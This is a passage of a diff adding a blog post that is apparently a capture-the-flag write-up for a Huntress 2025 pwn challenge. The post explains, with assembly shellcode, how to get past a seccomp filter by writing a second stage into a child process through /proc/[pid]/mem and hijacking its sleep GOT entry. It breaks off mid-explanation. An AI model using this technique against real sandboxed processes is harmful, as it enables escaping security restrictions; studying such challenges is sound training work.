@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+No Limits Huntress 2025 | XeroExecute Blog
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hugo 0.148.2">
+
+
+<link rel="canonical" href="https://XeroExecute.github.io/posts/nolimits/" >
+
+
+
+
+<link href="/css/style.min.90736ee77f53c2c00d3420ec289628098ca29b2bb76d548c974fc6d5d973ec50.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div class="headerLogoContainer">
+            <a href="https://XeroExecute.github.io/" class="headerLogo">
+                <img src="/logo.png" alt="XeroExecute" class="logoImg">
+            </a>
+            <a class="terminal" href="https://XeroExecute.github.io/">
+                <span>blog@XeroExecute.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="https://XeroExecute.github.io/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>No Limits Huntress 2025</h1>
+    
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/pwn/">#Pwn</a><span></span>
+    <a href="/tags/ctf/">#Ctf</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2025-11-01">November 1, 2025</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>10 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    
+    <aside class="toc-container">
+        <h2>Table of Contents</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#analyzing-the-binary">Analyzing the binary</a></li>
+        <li><a href="#crafting-the-exploit">Crafting the Exploit</a></li>
+        <li><a href="#solvepy">solve.py</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </aside>
+    
+    <div>
+        <h2 id="description">Description</h2>
+<p>Even when you only have a few options, don&rsquo;t let anything hold you back!<br>
+Author: Wittner</p>
+<h2 id="solution">Solution</h2>
+<p>For this challenge we are given a simple binary to reverse engineer and exploit to retrieve the flag.
+The challenge author even provides us with a note on where to locate the flag on the filesystem.</p>
+<blockquote>
+<p>The flag is in the root directory at /flag.txt</p></blockquote>
+<h3 id="analyzing-the-binary">Analyzing the binary</h3>
+<p>First, we run <code>checksec</code> to gather some information about the binarys security features:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">checksec --file<span class="o">=</span>no_limits
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;no_limits&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:      Canary found
+</span></span><span class="line"><span class="cl">    NX:         NX enabled
+</span></span><span class="line"><span class="cl">    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span></code></pre></div><p>Key observations:</p>
+<ul>
+<li><strong>No PIE</strong>: All addresses are fixed, making exploitation easier</li>
+<li><strong>Partial RELRO</strong>: GOT entries are writable</li>
+<li><strong>NX enabled</strong>: Stack is not executable</li>
+</ul>
+<p>Next we can load the binary into a decompiler to analyze its functionality.
+One key observation is that there is a <code>fork()</code> call at the very beginning of the <code>main</code> function.
+The parent process handles a simple menu, while the child process enters an infinite loop.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v6</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">v6</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// PARENT PROCESS - handles menu
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// CHILD PROCESS - infinite loop
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="parent-process">Parent Process</h4>
+<p>The parent process presents a menu with four options:</p>
+<ul>
+<li>Create Memory: Allows memory allocation with custom permissions</li>
+<li>Get Debug Informationn: Prints the PID of the child process</li>
+<li>Execute Code: Can execute code at arbitrary addresses</li>
+<li>Exit</li>
+</ul>
+<p>This makes it quite simple to execute shellcode in the parent process. However before the code is executed there is a seccomp filter applied.
+Since it operates on an allowlist, only a limited number of syscalls are permitted, and this cannot be circumvented by using alternative syscalls that provide similar functionality.
+Execute Code section:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Where do you want to execute code?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ProtectProgram</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">v12</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">v9</span><span class="p">();</span>
+</span></span></code></pre></div><p>ProtectProgram applies the seccomp filter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v22</span> <span class="o">=</span> <span class="nf">seccomp_init</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">v1</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">v2</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v3</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v4</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v6</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v7</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v8</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v9</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v10</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v11</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v12</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v11</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v13</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v12</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v14</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v15</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v16</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v17</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v18</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v19</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v20</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v19</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">v21</span> <span class="o">=</span> <span class="nf">seccomp_rule_add</span><span class="p">(</span><span class="n">v22</span><span class="p">,</span> <span class="mi">2147418112</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">v20</span><span class="p">;</span>
+</span></span></code></pre></div><p>Based on this, the allowed syscalls in the parent process are:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Syscall #</th>
+          <th>Name</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>write</td>
+          <td>Write to file descriptor</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>open</td>
+          <td>Open file</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>stat</td>
+          <td>Get file status</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>fstat</td>
+          <td>Get file status (by fd)</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>lstat</td>
+          <td>Get symbolic link status</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>lseek</td>
+          <td>Reposition file offset</td>
+      </tr>
+      <tr>
+          <td>10</td>
+          <td>mprotect</td>
+          <td>Set memory protection</td>
+      </tr>
+      <tr>
+          <td>12</td>
+          <td>brk</td>
+          <td>Change data segment size</td>
+      </tr>
+      <tr>
+          <td>21</td>
+          <td>access</td>
+          <td>Check file accessibility</td>
+      </tr>
+      <tr>
+          <td>24</td>
+          <td>sched_yield</td>
+          <td>Yield processor</td>
+      </tr>
+      <tr>
+          <td>32</td>
+          <td>dup</td>
+          <td>Duplicate file descriptor</td>
+      </tr>
+      <tr>
+          <td>33</td>
+          <td>dup2</td>
+          <td>Duplicate file descriptor</td>
+      </tr>
+      <tr>
+          <td>56</td>
+          <td>clone</td>
+          <td>Create child process</td>
+      </tr>
+      <tr>
+          <td>57</td>
+          <td>fork</td>
+          <td>Create child process</td>
+      </tr>
+      <tr>
+          <td>58</td>
+          <td>vfork</td>
+          <td>Create child process</td>
+      </tr>
+      <tr>
+          <td>60</td>
+          <td>exit</td>
+          <td>Exit process</td>
+      </tr>
+      <tr>
+          <td>62</td>
+          <td>kill</td>
+          <td>Send signal to process</td>
+      </tr>
+      <tr>
+          <td>96</td>
+          <td>gettimeofday</td>
+          <td>Get time</td>
+      </tr>
+      <tr>
+          <td>102</td>
+          <td>getuid</td>
+          <td>Get user ID</td>
+      </tr>
+      <tr>
+          <td>104</td>
+          <td>getgid</td>
+          <td>Get group ID</td>
+      </tr>
+      <tr>
+          <td>231</td>
+          <td>exit_group</td>
+          <td>Exit all threads</td>
+      </tr>
+  </tbody>
+</table>
+<p>Notably, <code>read()</code> (syscall 0) is not allowed, which prevents direct file reading from the parent process.</p>
+<h4 id="child-process">Child Process</h4>
+<p>The child process enters an infinite loop where it allocates memory and then loops, sleeping for 5 seconds each iteration.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x100u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;Hello world!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;Give me the flag!&#34;</span><span class="p">,</span> <span class="mh">0x11u</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I will not give you the flag!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;exit&#34;</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">v7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sleep</span><span class="p">(</span><span class="mi">5u</span><span class="p">);</span>  <span class="c1">// ← Key: calls sleep every 5 seconds!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>Most importantly, the child process has <em>No seccomp restrictions</em> and therefore any syscall can be used.</p>
+<h3 id="crafting-the-exploit">Crafting the Exploit</h3>
+<p>To solve this challenge and read the flag from the filesystem both processes can be used.
+As there is no way to use the read syscall in the parent process, we can leverage the child process to read the flag.
+The exploitation steps are as follows:</p>
+<ol>
+<li>Use shellcode in the parent to inject shellcode into the child&rsquo;s memory</li>
+<li>Hijack the child&rsquo;s GOT to redirect <code>sleep()</code> to our shellcode</li>
+<li>Wait for the child to call <code>sleep()</code> from its infinite loop</li>
+<li>The child executes the written shellcode without any seccomp restrictions and reads the flag</li>
+</ol>
+<p>The exploitation relies on a special Linux interface: <code>/proc/[pid]/mem</code>. This pseudo-file provides direct access to a process virtual memory space. By opening this file with write permissions, arbitrary data can be written into the target process memory, even into read-only sections like <code>.text</code>.</p>
+<p>The parent process can open <code>/proc/[child_pid]/mem</code>, use <code>lseek()</code> to position at the target address, and use <code>write()</code> to inject shellcode. All those syscalls are permitted under the seccomp filter.
+Since PIE is disabled, all addresses are fixed and predictable.</p>
+<h4 id="shellcode">Shellcode</h4>
+<p>The injected shellcode is split into two parts:</p>
+<ul>
+<li><strong>Stage 1</strong>: Runs in the parent process (must be seccomp compliant)</li>
+<li><strong>Stage 2</strong>: Runs in the child process (no seccomp restrictions)</li>
+</ul>
+<h5 id="stage-1-parent-shellcode">Stage 1: Parent Shellcode</h5>
+<p>The first stage must work within the seccomp restrictions. Its sole purpose is to inject stage 2 into the child&rsquo;s memory and hijack the GOT. It uses only the allowed syscalls: <code>open</code>, <code>lseek</code>, and <code>write</code>.</p>
+<p><strong>Getting the Current Instruction Pointer:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">.intel_syntax</span> <span class="no">noprefix</span>
+</span></span><span class="line"><span class="cl">    <span class="na">.globl</span> <span class="no">_start</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">_start:</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">call</span> <span class="no">get_rip</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">get_rip:</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">pop</span> <span class="no">rbx</span>
+</span></span></code></pre></div><p>This uses the classic <code>call/pop</code> technique to obtain the current instruction pointer. The <code>call</code> pushes the return address onto the stack, which is immediately retrieved using <code>pop</code> into <code>rbx</code>. This allows the calculation of the relative addresses for position-independent code.</p>
+<p><strong>Locating Stage 2 Within the Code:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">lea</span> <span class="no">r12</span><span class="p">,</span> <span class="no">stage2</span><span class="p">[</span><span class="no">rip</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">lea</span> <span class="no">r13</span><span class="p">,</span> <span class="no">stage2_end</span><span class="p">[</span><span class="no">rip</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="no">r13</span><span class="p">,</span> <span class="no">r12</span>
+</span></span></code></pre></div><p>These instructions calculate the location and size of stage 2, which is embedded at the end of the shellcode. <code>r12</code> now holds the address of stage 2, and <code>r13</code> holds its size in bytes. This is crucial because stage 2 needs to be copied into the child&rsquo;s memory.</p>
+<p><strong>Opening the child&rsquo;s Memory:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">path</span><span class="p">[</span><span class="no">rip</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">1</span>              <span class="cm">/* O_WRONLY */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">2</span>              <span class="cm">/* sys_open */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+</span></span></code></pre></div><p>Opens <code>/proc/[child_pid]/mem</code> with write-only permissions. This special file provides direct access to the child process virtual memory. The file descriptor is saved in <code>rdi</code> for subsequent operations.
+Crucially, this file allows the shellcode to write to any mapped region in the child&rsquo;s address space, including read-only sections.</p>
+<p><strong>Writing Stage 2 to child&rsquo;s .text Section:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>              <span class="cm">/* sys_lseek */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">movabs</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x4012B0</span>    <span class="cm">/* target address in child */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>            
+</span></span><span class="line"><span class="cl">    <span class="no">syscall</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>              <span class="cm">/* sys_write */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">r12</span>            <span class="cm">/* source buffer */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">r13</span>            <span class="cm">/* size */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span></code></pre></div><p>First, <code>lseek</code> positions the file pointer to <code>0x4012B0</code> in the child&rsquo;s memory. This is the start address of the child&rsquo;s <code>.text</code> section where the second stage will be written.
+Then, <code>write</code> copies the stage 2 bytes from the parent process memory <code>r12</code> (Locating Stage 2 Within the Code) into the child&rsquo;s <code>.text</code> section. Even though <code>.text</code> is normally read-only, writing through <code>/proc/pid/mem</code> bypasses this protection.</p>
+<p><strong>Hijacking the child&rsquo;s GOT:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">movabs</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x4040a8</span>    <span class="cm">/* sleep@GOT */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">lea</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">got_value</span><span class="p">[</span><span class="no">rip</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span></code></pre></div><p>The code seeks to the GOT entry for <code>sleep()</code> at <code>0x4040a8</code>, then writes an 8-byte value: <code>0x4012B0</code>. This overwrites the GOT entry, so when the child calls <code>sleep()</code>, it will instead jump to <code>0x4012B0</code> where the stage 2 shellcode now resides.</p>
+<p><strong>Parent infinite loop:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">.align</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">loop:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">jmp</span> <span class="no">loop</span>
+</span></span></code></pre></div><p>An infinite loop keeps the parent process running. This is necessary because if the parent exits, the entire process tree (including the child) would be killed.</p>
+<p><strong>Data Section:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="na">.align</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">got_value:</span>
+</span></span><span class="line"><span class="cl">    <span class="na">.quad</span> <span class="mi">0x4012B0</span>          <span class="cm">/* Value to write into GOT */</span>
+</span></span><span class="line"><span class="cl"><span class="na">.align</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="nl">path:</span>
+</span></span><span class="line"><span class="cl">    <span class="na">.asciz</span> <span class="s">&#34;/proc/{child_pid}/mem&#34;</span>
+</span></span></code></pre></div><p>Contains the data needed by stage1: the address to write into the GOT, and the path string for opening the child&rsquo;s memory.</p>
+<h5 id="stage-2-child-shellcode">Stage 2: Child Shellcode</h5>
+<p>Stage 2 is embedded at the end of the full shellcode payload. During stage 1 execution, it copies stage 2 into the child&rsquo;s memory at address <code>0x4012B0</code>. Later, when the child calls <code>sleep()</code> in its infinite loop, the hijacked GOT entry redirects execution to our injected stage 2 shellcode.</p>
+<p><strong>Opening the Flag File:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">stage2:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">lea</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">flagpath</span><span class="p">[</span><span class="no">rip</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsi</span>            <span class="cm">/* O_RDONLY */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">2</span>              <span class="cm">/* sys_open */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+</span></span></code></pre></div><p>Opens <code>/flag.txt</code> for reading. The file descriptor is saved in <code>rdi</code>. This uses the same <code>open()</code> syscall that stage1 used.</p>
+<p><strong>Reading the Flag:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x300</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x200</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>            <span class="cm">/* sys_read */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">syscall</span>
+</span></span></code></pre></div><p>Allocates 0x300 bytes of stack space as a buffer, then uses <code>read()</code> to read up to 0x200 bytes from the file into that buffer. The important point: <strong><code>read()</code> (syscall 0) is blocked in the parent by seccomp, but works in the child</strong> because the child has no seccomp restrictions.</p>
+<p><strong>Writing Flag to stdout:</strong></p>
